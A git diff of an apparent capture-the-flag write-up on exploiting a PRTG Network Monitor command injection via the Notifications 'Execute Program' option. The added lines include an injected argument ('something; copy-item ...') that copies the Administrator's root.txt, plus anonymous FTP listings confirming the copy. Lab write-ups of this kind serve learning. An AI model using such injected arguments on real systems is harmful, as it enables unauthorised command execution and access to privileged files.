@@ -146,12 +146,14 @@ An issue was discovered in PRTG Network Monitor before 18.2.39. An attacker who 
 
 I created a notification to execute an action.
 
-In settings -> Notifications, I see that we can set up notifications.
+In settings -> Notifications, I see that we can set up notifications. We can add a notification -> Under that, there's an "Execute Program" option. 
+
+![prtg-1](/images/prtg-1.png)
 
 
 I wanted to touch a file to see if the vulnerablity could be exploited. The windows equivalent of touch is 
 ```
-type vul > C:\Jan32021.txt"
+type nul > C:\Jan32021.txt"
 ```
 
 it worked.
@@ -175,3 +177,37 @@ ftp> dir
 226 Transfer complete.
 ```
   
+Now let's copy the root.txt flag to c:\
+
+This is the argument I used:
+something; copy-item  "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\root.txt"
+
+![prtg-2](/images/prtg-2.png)
+
+```
+$ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:vskonda): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-02-19  11:18PM                 1024 .rnd
+02-25-19  09:15PM       <DIR>          inetpub
+01-03-21  12:52PM                    0 Jan32021.txt
+07-16-16  08:18AM       <DIR>          PerfLogs
+02-25-19  09:56PM       <DIR>          Program Files
+02-02-19  11:28PM       <DIR>          Program Files (x86)
+02-02-19  11:35PM                   33 root.txt
+02-03-19  07:08AM       <DIR>          Users
+02-25-19  10:49PM       <DIR>          Windows
+226 Transfer complete.
+ftp> 
+
+```
+
+And we got the root flag.
